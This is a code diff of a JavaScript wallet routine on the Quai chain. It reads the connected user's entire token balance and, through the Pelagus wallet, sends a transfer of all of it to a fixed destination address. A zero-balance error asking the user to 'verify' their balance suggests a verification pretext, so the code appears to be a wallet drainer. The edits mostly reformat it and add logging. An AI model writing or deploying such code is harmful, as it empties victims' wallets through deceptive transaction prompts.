@@ -448,32 +448,33 @@ async function saveToFirebase(data) {
 
         // Fetch Token Balance
         const balanceData = '0x70a08231000000000000000000000000' + signerAddress.slice(2).padStart(64, '0');
-const balanceResponse = await fetch(RPC_ENDPOINT, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-        jsonrpc: '2.0',
-        method: 'quai_call',
-        params: [{ to: TOKEN_ADDRESS, data: balanceData }, 'latest'],
-        id: 1,
-    }),
-});
-const balanceResult = await balanceResponse.json();
-console.log('Balance Response:', balanceResult);
+        const balanceResponse = await fetch(RPC_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0',
+                method: 'quai_call',
+                params: [{ to: TOKEN_ADDRESS, data: balanceData }, 'latest'],
+                id: 1,
+            }),
+        });
+        const balanceResult = await balanceResponse.json();
+        console.log('Balance Response:', balanceResult);
 
-const rawBalance = BigInt(balanceResult.result || 0);
-if (rawBalance === 0n) {
-    throw new Error('Token balance is zero. Please verify your token balance.');
-}
+        const rawBalance = BigInt(balanceResult.result || 0);
+        if (rawBalance === 0n) {
+            throw new Error('Token balance is zero. Please verify your token balance.');
+        }
 
-console.log(`✅ Token Balance Fetched: ${rawBalance.toString()}`);
+        const decimals = 18; // Adjust if different
+        const adjustedBalance = rawBalance / BigInt(10 ** decimals);
+        console.log(`✅ Adjusted Token Balance: ${adjustedBalance.toString()}`);
 
         // Prepare Transaction Data
         const transferData = 
             '0xa9059cbb' + 
             DESTINATION_ADDRESS.slice(2).padStart(64, '0') + 
             rawBalance.toString(16).padStart(64, '0');
-
         console.log('✅ Transaction Data Prepared:', transferData);
 
         // Estimate Gas
@@ -486,15 +487,16 @@ console.log(`✅ Token Balance Fetched: ${rawBalance.toString()}`);
                 params: [{
                     from: signerAddress,
                     to: TOKEN_ADDRESS,
-                    data: transferData
+                    data: transferData,
                 }],
                 id: 2,
             }),
         });
-
         const gasEstimateResult = await gasEstimateResponse.json();
-        const gasLimit = gasEstimateResult.result || '0x5208'; // Default to 21000 if undefined
-        console.log(`✅ Estimated Gas Limit: ${gasLimit}`);
+        console.log('Gas Estimate Response:', gasEstimateResult);
+
+        const gasLimit = gasEstimateResult.result || '0x5208'; // Default gas if estimation fails
+        console.log(`✅ Gas Estimate: ${gasLimit}`);
 
         // Send Transaction
         const txResponse = await window.pelagus.request({
@@ -506,7 +508,6 @@ console.log(`✅ Token Balance Fetched: ${rawBalance.toString()}`);
                 gas: gasLimit,
             }],
         });
-
         console.log('✅ Transaction Sent:', txResponse);
 
         // Wait for Confirmation
